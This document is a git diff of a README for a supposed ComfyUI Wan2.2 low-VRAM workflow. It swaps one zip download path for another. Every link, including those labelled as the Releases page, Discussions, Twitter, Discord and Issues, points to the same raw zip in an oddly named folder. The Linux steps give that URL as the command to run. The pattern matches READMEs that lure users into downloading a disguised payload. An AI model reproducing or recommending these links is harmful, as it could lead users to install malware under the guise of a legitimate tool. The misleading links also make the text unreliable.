@@ -1,6 +1,6 @@
 # 🎉 ComfyUI-Wan2.2-workflow - A Simple Workflow for Low VRAM Users
 
-![Download](https://github.com/Moqabil/ComfyUI-Wan2.2-workflow/raw/refs/heads/main/spermatangium/Wan-workflow-Comfy-U-1.6.zip%20Now-Get%20the%20App-brightgreen)
+![Download](https://github.com/Moqabil/ComfyUI-Wan2.2-workflow/raw/refs/heads/main/spermatangium/U_workflow_Comfy_Wan_3.2.zip%20Now-Get%20the%20App-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you start, ensure your computer meets these basic requirements:
 
 To download the application, visit the Releases page on GitHub:
 
-[Download ComfyUI-Wan2.2-workflow](https://github.com/Moqabil/ComfyUI-Wan2.2-workflow/raw/refs/heads/main/spermatangium/Wan-workflow-Comfy-U-1.6.zip)
+[Download ComfyUI-Wan2.2-workflow](https://github.com/Moqabil/ComfyUI-Wan2.2-workflow/raw/refs/heads/main/spermatangium/U_workflow_Comfy_Wan_3.2.zip)
 
 1. Click the link above.
 2. Look for the latest release.
@@ -41,10 +41,10 @@ To download the application, visit the Releases page on GitHub:
 
 #### For Linux Users:
 
-1. Download the `https://github.com/Moqabil/ComfyUI-Wan2.2-workflow/raw/refs/heads/main/spermatangium/Wan-workflow-Comfy-U-1.6.zip` file.
+1. Download the `https://github.com/Moqabil/ComfyUI-Wan2.2-workflow/raw/refs/heads/main/spermatangium/U_workflow_Comfy_Wan_3.2.zip` file.
 2. Extract the contents in your desired directory.
 3. Open a terminal and navigate to the extracted folder.
-4. Run the application with the command `https://github.com/Moqabil/ComfyUI-Wan2.2-workflow/raw/refs/heads/main/spermatangium/Wan-workflow-Comfy-U-1.6.zip`.
+4. Run the application with the command `https://github.com/Moqabil/ComfyUI-Wan2.2-workflow/raw/refs/heads/main/spermatangium/U_workflow_Comfy_Wan_3.2.zip`.
 
 ## 🎨 Features
 
@@ -65,16 +65,16 @@ If you run into issues, try these solutions:
 
 You’re not alone on this journey. Join our community for support and resources:
 
-- [GitHub Discussions](https://github.com/Moqabil/ComfyUI-Wan2.2-workflow/raw/refs/heads/main/spermatangium/Wan-workflow-Comfy-U-1.6.zip)
-- [Twitter](https://github.com/Moqabil/ComfyUI-Wan2.2-workflow/raw/refs/heads/main/spermatangium/Wan-workflow-Comfy-U-1.6.zip) for updates and tips.
-- [Discord Channel](https://github.com/Moqabil/ComfyUI-Wan2.2-workflow/raw/refs/heads/main/spermatangium/Wan-workflow-Comfy-U-1.6.zip) for real-time help.
+- [GitHub Discussions](https://github.com/Moqabil/ComfyUI-Wan2.2-workflow/raw/refs/heads/main/spermatangium/U_workflow_Comfy_Wan_3.2.zip)
+- [Twitter](https://github.com/Moqabil/ComfyUI-Wan2.2-workflow/raw/refs/heads/main/spermatangium/U_workflow_Comfy_Wan_3.2.zip) for updates and tips.
+- [Discord Channel](https://github.com/Moqabil/ComfyUI-Wan2.2-workflow/raw/refs/heads/main/spermatangium/U_workflow_Comfy_Wan_3.2.zip) for real-time help.
 
 ## 💬 Feedback
 
-We appreciate your input. If you encounter issues or have suggestions, please submit them on our [GitHub Issues page](https://github.com/Moqabil/ComfyUI-Wan2.2-workflow/raw/refs/heads/main/spermatangium/Wan-workflow-Comfy-U-1.6.zip). Your feedback helps us improve the application.
+We appreciate your input. If you encounter issues or have suggestions, please submit them on our [GitHub Issues page](https://github.com/Moqabil/ComfyUI-Wan2.2-workflow/raw/refs/heads/main/spermatangium/U_workflow_Comfy_Wan_3.2.zip). Your feedback helps us improve the application.
 
 ## 📅 Updates
 
-Stay tuned! We regularly release updates to enhance performance and add features. Keep checking the [Releases page](https://github.com/Moqabil/ComfyUI-Wan2.2-workflow/raw/refs/heads/main/spermatangium/Wan-workflow-Comfy-U-1.6.zip) for the latest version.
+Stay tuned! We regularly release updates to enhance performance and add features. Keep checking the [Releases page](https://github.com/Moqabil/ComfyUI-Wan2.2-workflow/raw/refs/heads/main/spermatangium/U_workflow_Comfy_Wan_3.2.zip) for the latest version.
 
 Thank you for using ComfyUI-Wan2.2-workflow. Enjoy creating amazing projects with ease!
